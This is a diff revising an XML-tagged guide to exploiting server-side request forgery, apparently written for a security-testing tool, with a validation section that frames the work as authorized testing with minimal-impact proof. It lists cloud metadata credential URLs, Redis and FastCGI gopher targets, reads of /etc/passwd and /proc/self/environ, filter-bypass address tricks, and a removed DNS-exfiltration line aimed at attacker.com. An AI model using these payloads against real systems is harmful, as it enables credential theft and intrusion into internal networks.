@@ -1,168 +1,135 @@
 <ssrf_vulnerability_guide>
-<title>SERVER-SIDE REQUEST FORGERY (SSRF) - ADVANCED EXPLOITATION</title>
+<title>SERVER-SIDE REQUEST FORGERY (SSRF)</title>
 
-<critical>SSRF can lead to internal network access, cloud metadata theft, and complete infrastructure compromise.</critical>
+<critical>SSRF enables the server to reach networks and services the attacker cannot. Focus on cloud metadata endpoints, service meshes, Kubernetes, and protocol abuse to turn a single fetch into credentials, lateral movement, and sometimes RCE.</critical>
 
-<common_injection_points>
-- URL parameters: url=, link=, path=, src=, href=, uri=
-- File import/export features
-- Webhooks and callbacks
-- PDF generators (wkhtmltopdf)
-- Image processing (ImageMagick)
-- Document parsers
-- Payment gateways (IPN callbacks)
-- Social media card generators
-- URL shorteners/expanders
-</common_injection_points>
+<scope>
+- Outbound HTTP/HTTPS fetchers (proxies, previewers, importers, webhook testers)
+- Non-HTTP protocols via URL handlers (gopher, dict, file, ftp, smb wrappers)
+- Service-to-service hops through gateways and sidecars (envoy/nginx)
+- Cloud and platform metadata endpoints, instance services, and control planes
+</scope>
 
-<hidden_contexts>
-- Referer headers in analytics
-- Link preview generation
-- RSS/Feed fetchers
-- Repository cloning (Git/SVN)
-- Package managers (npm, pip)
-- Calendar invites (ICS files)
-- OAuth redirect_uri
-- SAML endpoints
-- GraphQL field resolvers
-</hidden_contexts>
+<methodology>
+1. Identify every user-influenced URL/host/path across web/mobile/API and background jobs. Include headers that trigger server-side fetches (link previews, analytics, crawler hooks).
+2. Establish a quiet oracle first (OAST DNS/HTTP callbacks). Then pivot to internal addressing (loopback, RFC1918, link-local, IPv6, hostnames) and protocol variations.
+3. Enumerate redirect behavior, header propagation, and method control (GET-only vs arbitrary). Test parser differentials across frameworks, CDNs, and language libraries.
+4. Target high-value services (metadata, kubelet, Redis, FastCGI, Docker, Vault, internal admin panels). Chain to write/exec primitives if possible.
+</methodology>
 
-<cloud_metadata>
+<injection_surfaces>
+- Direct URL params: url=, link=, fetch=, src=, webhook=, avatar=, image=
+- Indirect sources: Open Graph/link previews, PDF/image renderers, server-side analytics (Referer trackers), import/export jobs, webhooks/callback verifiers
+- Protocol-translating services: PDF via wkhtmltopdf/Chrome headless, image pipelines, document parsers, SSO validators, archive expanders
+- Less obvious: GraphQL resolvers that fetch by URL, background crawlers, repository/package managers (git, npm, pip), calendar (ICS) fetchers
+</injection_surfaces>
+
+<cloud_and_platforms>
 <aws>
-Legacy: http://169.254.169.254/latest/meta-data/
-IMDSv2: Requires token but check if app proxies headers
-Key targets: /iam/security-credentials/, /user-data/
+- IMDSv1: http://169.254.169.254/latest/meta-data/ → {% raw %}/iam/security-credentials/{role}{% endraw %}, {% raw %}/user-data{% endraw %}
+- IMDSv2: requires token via PUT {% raw %}/latest/api/token{% endraw %} with header {% raw %}X-aws-ec2-metadata-token-ttl-seconds{% endraw %}, then include {% raw %}X-aws-ec2-metadata-token{% endraw %} on subsequent GETs. If the sink cannot set headers or methods, fallback to other targets or seek intermediaries that can
+- ECS/EKS task credentials: {% raw %}http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI{% endraw %}
 </aws>
 
-<google_cloud>
-http://metadata.google.internal/computeMetadata/v1/
-Requires: Metadata-Flavor: Google header
-Target: /instance/service-accounts/default/token
-</google_cloud>
+<gcp>
+- Endpoint: http://metadata.google.internal/computeMetadata/v1/
+- Required header: {% raw %}Metadata-Flavor: Google{% endraw %}
+- Target: {% raw %}/instance/service-accounts/default/token{% endraw %}
+</gcp>
 
 <azure>
-http://169.254.169.254/metadata/instance?api-version=2021-02-01
-Requires: Metadata: true header
-OAuth: /metadata/identity/oauth2/token
+- Endpoint: http://169.254.169.254/metadata/instance?api-version=2021-02-01
+- Required header: {% raw %}Metadata: true{% endraw %}
+- MSI OAuth: {% raw %}/metadata/identity/oauth2/token{% endraw %}
 </azure>
-</cloud_metadata>
 
-<internal_services>
-<port_scanning>
-Common ports: 21,22,80,443,445,1433,3306,3389,5432,6379,8080,9200,27017
-</port_scanning>
+<kubernetes>
+- Kubelet: 10250 (authenticated) and 10255 (deprecated read-only). Probe {% raw %}/pods{% endraw %}, {% raw %}/metrics{% endraw %}, exec/attach endpoints
+- API server: https://kubernetes.default.svc/. Authorization often needs the service account token; SSRF that propagates headers/cookies may reuse them
+- Service discovery: attempt cluster DNS names (svc.cluster.local) and default services (kube-dns, metrics-server)
+</kubernetes>
+</cloud_and_platforms>
 
-<service_fingerprinting>
-- Elasticsearch: http://localhost:9200/_cat/indices
-- Redis: dict://localhost:6379/INFO
-- MongoDB: http://localhost:27017/test
-- Docker: http://localhost:2375/v1.24/containers/json
-- Kubernetes: https://kubernetes.default.svc/api/v1/
-</service_fingerprinting>
-</internal_services>
+<internal_targets>
+- Docker API: http://localhost:2375/v1.24/containers/json (no TLS variants often internal-only)
+- Redis/Memcached: dict://localhost:11211/stat, gopher payloads to Redis on 6379
+- Elasticsearch/OpenSearch: http://localhost:9200/_cat/indices
+- Message brokers/admin UIs: RabbitMQ, Kafka REST, Celery/Flower, Jenkins crumb APIs
+- FastCGI/PHP-FPM: gopher://localhost:9000/ (craft records for file write/exec when app routes to FPM)
+</internal_targets>
 
 <protocol_exploitation>
 <gopher>
-Redis RCE, SMTP injection, FastCGI exploitation
+- Speak raw text protocols (Redis/SMTP/IMAP/HTTP/FCGI). Use to craft multi-line payloads, schedule cron via Redis, or build FastCGI requests
 </gopher>
 
-<file>
-file:///etc/passwd, file:///proc/self/environ
-</file>
+<file_and_wrappers>
+- file:///etc/passwd, file:///proc/self/environ when libraries allow file handlers
+- jar:, netdoc:, smb:// and language-specific wrappers (php://, expect://) where enabled
+</file_and_wrappers>
 
-<dict>
-dict://localhost:11211/stat (Memcached)
-</dict>
-</protocol_exploitation>
+<parser_and_filter_bypasses>
+<address_variants>
+- Loopback: 127.0.0.1, 127.1, 2130706433, 0x7f000001, ::1, [::ffff:127.0.0.1]
+- RFC1918/link-local: 10/8, 172.16/12, 192.168/16, 169.254/16; test IPv6-mapped and mixed-notation forms
+</address_variants>
 
-<bypass_techniques>
-<dns_rebinding>
-First request → your server, second → 127.0.0.1
-</dns_rebinding>
+<url_confusion>
+- Userinfo and fragments: http://internal@attacker/ or http://attacker#@internal/
+- Scheme-less/relative forms the server might complete internally: //169.254.169.254/
+- Trailing dots and mixed case: internal. vs INTERNAL, Unicode dot lookalikes
+</url_confusion>
 
-<encoding_tricks>
-- Decimal IP: http://2130706433/ (127.0.0.1)
-- Octal: http://0177.0.0.1/
-- Hex: http://0x7f.0x0.0x0.0x1/
-- IPv6: http://[::1]/, http://[::ffff:127.0.0.1]/
-</encoding_tricks>
+<redirect_behavior>
+- Allowlist only applied pre-redirect: 302 from attacker → internal host. Test multi-hop and protocol switches (http→file/gopher via custom clients)
+</redirect_behavior>
 
-<url_parser_confusion>
-- Authority: http://expected@evil/
-- Unicode: http://⑯⑨。②⑤④。⑯⑨。②⑤④/
-</url_parser_confusion>
+<header_and_method_control>
+- Some sinks reflect or allow CRLF-injection into the request line/headers; if arbitrary headers/methods are possible, IMDSv2, GCP, and Azure become reachable
+</header_and_method_control>
 
-<redirect_chains>
-302 → yourserver.com → 169.254.169.254
-</redirect_chains>
-</bypass_techniques>
+<blind_and_mapping>
+- Use OAST (DNS/HTTP) to confirm egress. Derive internal reachability from timing, response size, TLS errors, and ETag differences
+- Build a port map by binary searching timeouts (short connect/read timeouts yield cleaner diffs)
+</blind_and_mapping>
 
-<advanced_techniques>
-<blind_ssrf>
-- DNS exfiltration: http://$(hostname).attacker.com/
-- Timing attacks for network mapping
-- Error-based detection
-</blind_ssrf>
+<chaining>
+- SSRF → Metadata creds → cloud API access (list buckets, read secrets)
+- SSRF → Redis/FCGI/Docker → file write/command execution → shell
+- SSRF → Kubelet/API → pod list/logs → token/secret discovery → lateral
+</chaining>
 
-<ssrf_to_rce>
-- Redis: gopher://localhost:6379/ (cron injection)
-- Memcached: gopher://localhost:11211/
-- FastCGI: gopher://localhost:9000/
-</ssrf_to_rce>
-</advanced_techniques>
+<validation>
+1. Prove an outbound server-initiated request occurred (OAST interaction or internal-only response differences).
+2. Show access to non-public resources (metadata, internal admin, service ports) from the vulnerable service.
+3. Where possible, demonstrate minimal-impact credential access (short-lived token) or a harmless internal data read.
+4. Confirm reproducibility and document request parameters that control scheme/host/headers/method and redirect behavior.
+</validation>
 
-<filter_bypasses>
-<localhost>
-127.1, 0177.0.0.1, 0x7f000001, 2130706433, 127.0.0.0/8, localtest.me
-</localhost>
+<false_positives>
+- Client-side fetches only (no server request)
+- Strict allowlists with DNS pinning and no redirect following
+- SSRF simulators/mocks returning canned responses without real egress
+- Blocked egress confirmed by uniform errors across all targets and protocols
+</false_positives>
 
-<parser_differentials>
-http://evil.com#@good.com/, http:evil.com
-</parser_differentials>
-
-<protocols>
-dict://, gopher://, ftp://, file://, jar://, netdoc://
-</protocols>
-</filter_bypasses>
-
-<validation_techniques>
-To confirm SSRF:
-1. External callbacks (DNS/HTTP)
-2. Internal network access (different responses)
-3. Time-based detection (timeouts)
-4. Cloud metadata retrieval
-5. Protocol differentiation
-</validation_techniques>
-
-<false_positive_indicators>
-NOT SSRF if:
-- Only client-side redirects
-- Whitelist properly blocking
-- Generic errors for all URLs
-- No outbound requests made
-- Same-origin policy enforced
-</false_positive_indicators>
-
-<impact_demonstration>
-- Cloud credential theft (AWS/GCP/Azure)
-- Internal admin panel access
-- Port scanning results
-- SSRF to RCE chain
-- Data exfiltration
-</impact_demonstration>
+<impact>
+- Cloud credential disclosure with subsequent control-plane/API access
+- Access to internal control panels and data stores not exposed publicly
+- Lateral movement into Kubernetes, service meshes, and CI/CD
+- RCE via protocol abuse (FCGI, Redis), Docker daemon access, or scriptable admin interfaces
+</impact>
 
 <pro_tips>
-1. Always check cloud metadata first
-2. Chain with other vulns (SSRF + XXE)
-3. Use time delays for blind SSRF
-4. Try all protocols, not just HTTP
-5. Automate internal network scanning
-6. Check parser quirks (language-specific)
-7. Monitor DNS for blind confirmation
-8. Try IPv6 (often forgotten)
-9. Abuse redirects for filter bypass
-10. SSRF can be in any URL-fetching feature
+1. Prefer OAST callbacks first; then iterate on internal addressing and protocols.
+2. Test IPv6 and mixed-notation addresses; filters often ignore them.
+3. Observe library/client differences (curl, Java HttpClient, Node, Go); behavior changes across services and jobs.
+4. Redirects are leverage: control both the initial allowlisted host and the next hop.
+5. Metadata endpoints require headers/methods; verify if your sink can set them or if intermediaries add them for you.
+6. Use tiny payloads and tight timeouts to map ports with minimal noise.
+7. When responses are masked, diff length/ETag/status and TLS error classes to infer reachability.
+8. Chain quickly to durable impact (short-lived tokens, harmless internal reads) and stop there.
 </pro_tips>
 
-<remember>SSRF is often the key to cloud compromise. A single SSRF in cloud = complete account takeover through metadata access.</remember>
+<remember>Any feature that fetches remote content on behalf of a user is a potential tunnel to internal networks and control planes. Bind scheme/host/port/headers explicitly or expect an attacker to route through them.</remember>
 </ssrf_vulnerability_guide>
